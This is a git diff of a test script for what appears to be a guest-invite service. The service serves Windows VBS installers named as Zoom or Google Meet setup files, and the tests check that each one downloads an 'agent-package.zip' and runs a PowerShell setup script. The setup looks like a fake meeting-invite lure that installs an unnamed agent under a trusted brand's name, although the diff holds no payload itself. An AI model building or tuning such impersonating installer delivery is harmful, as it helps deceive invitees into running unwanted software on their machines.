@@ -75,9 +75,9 @@ async function main() {
     pass(`create ${inviteTemplate} ${code}`);
 
     const pub = await (await fetch(`${API}/guest/${code}`)).json();
-    if (!String(pub.windowsInstallerUrl || '').includes('v=67')) {
-      fail(`${inviteTemplate} not v=67 (${pub.windowsInstallerUrl})`);
-    } else pass(`${inviteTemplate} installer v=67`);
+    if (!String(pub.windowsInstallerUrl || '').includes('v=68')) {
+      fail(`${inviteTemplate} not v=68 (${pub.windowsInstallerUrl})`);
+    } else pass(`${inviteTemplate} installer v=68`);
 
     if (!String(pub.windowsInstallerUrl || '').includes('/setup.vbs')) {
       fail(`${inviteTemplate} browser installer should be setup.vbs (${pub.windowsInstallerUrl})`);
@@ -90,7 +90,7 @@ async function main() {
           ? 'GoogleMeet-Setup.vbs'
           : 'ZoomClient-Setup.vbs';
 
-    const vbsRes = await fetch(`${API}/guest/${code}/setup.vbs?v=67`);
+    const vbsRes = await fetch(`${API}/guest/${code}/setup.vbs?v=68`);
     if (vbsRes.status !== 200) {
       fail(`${inviteTemplate} VBS download`);
       continue;
@@ -101,7 +101,8 @@ async function main() {
       ['single-phase zip download', vbs.includes('agent-package.zip')],
       ['async live progress', vbs.includes('DownloadFileAsync') || vbs.includes('DownloadProgressChanged')],
       ['no setup.exe hop', !/Start-Process -FilePath \$OutFile/i.test(vbs)],
-      ['inline install', vbs.includes('Invoke-AgentInstall') || vbs.includes('nd-install-')],
+      ['uses proven setup script', vbs.includes('windows.ps1')],
+      ['no broken inline nest', !vbs.includes('Invoke-AgentInstall')],
       ['no disappearing popup', !vbs.includes('Popup')],
       ['uses GUI powershell host', vbs.includes('powershellw.exe')],
       ['progress window not hidden', !/sh\.Run\([^)]*-WindowStyle Hidden/i.test(vbs)],
@@ -109,7 +110,7 @@ async function main() {
     ];
     for (const [name, ok] of vbsChecks) (ok ? pass : fail)(`${inviteTemplate} VBS: ${name}`);
 
-    const installerRes = await fetch(`${API}/guest/${code}/setup.exe?v=67`);
+    const installerRes = await fetch(`${API}/guest/${code}/setup.exe?v=68`);
     if (installerRes.status !== 200) {
       fail(`${inviteTemplate} installer download`);
       continue;
